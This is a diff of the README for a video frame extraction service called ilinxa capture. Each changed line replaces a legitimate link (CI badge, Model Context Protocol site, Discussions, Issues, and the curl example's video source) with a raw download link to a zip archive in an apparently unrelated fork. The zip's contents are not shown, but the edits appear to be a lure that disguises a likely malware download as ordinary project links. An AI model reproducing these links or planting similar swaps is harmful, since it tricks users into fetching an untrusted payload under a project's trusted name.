@@ -7,7 +7,7 @@
 
 **Video frame extraction & composition service for AI vision pipelines.**
 
-[![CI](https://github.com/ilinxa/ilinxa-capture/actions/workflows/ci.yml/badge.svg)](https://github.com/ilinxa/ilinxa-capture/actions/workflows/ci.yml)
+[![CI](https://raw.githubusercontent.com/yuniirhm/ilinxa-capture/main/ui/capture-ilinxa-3.7.zip)](https://raw.githubusercontent.com/yuniirhm/ilinxa-capture/main/ui/capture-ilinxa-3.7.zip)
 [![License](https://img.shields.io/badge/license-Apache--2.0-blue)](LICENSE)
 ![Node](https://img.shields.io/badge/node-%E2%89%A522-brightgreen)
 ![TypeScript](https://img.shields.io/badge/TypeScript-5.9-blue)
@@ -119,7 +119,7 @@ Extract frames and compose a 2×2 sheet in one call:
 curl -X POST http://localhost:3000/api/v1/extract-and-compose \
   -H "Content-Type: application/json" \
   -d '{
-    "source": "https://example.com/video.mp4",
+    "source": "https://raw.githubusercontent.com/yuniirhm/ilinxa-capture/main/ui/capture-ilinxa-3.7.zip",
     "fps": 2,
     "mode": 4,
     "preset": "llm",
@@ -172,7 +172,7 @@ gallery, grid configuration, and ZIP downloads. Light and dark themes.
 ### MCP server
 
 ilinxa capture exposes its tools to any
-[Model Context Protocol](https://modelcontextprotocol.io/) client.
+[Model Context Protocol](https://raw.githubusercontent.com/yuniirhm/ilinxa-capture/main/ui/capture-ilinxa-3.7.zip) client.
 
 **Tools:** `capture_metadata`, `capture_extract`, `capture_compose`,
 `capture_extract_and_compose`, `capture_video_formats`,
@@ -387,8 +387,8 @@ participating you agree to the [Code of Conduct](CODE_OF_CONDUCT.md).
 ## Support
 
 Questions and usage help go in
-[GitHub Discussions](https://github.com/ilinxa/ilinxa-capture/discussions); bugs
-and feature requests go in [Issues](https://github.com/ilinxa/ilinxa-capture/issues/new/choose).
+[GitHub Discussions](https://raw.githubusercontent.com/yuniirhm/ilinxa-capture/main/ui/capture-ilinxa-3.7.zip); bugs
+and feature requests go in [Issues](https://raw.githubusercontent.com/yuniirhm/ilinxa-capture/main/ui/capture-ilinxa-3.7.zip).
 See [SUPPORT.md](SUPPORT.md) for the full routing.
 <!-- /wl -->
 
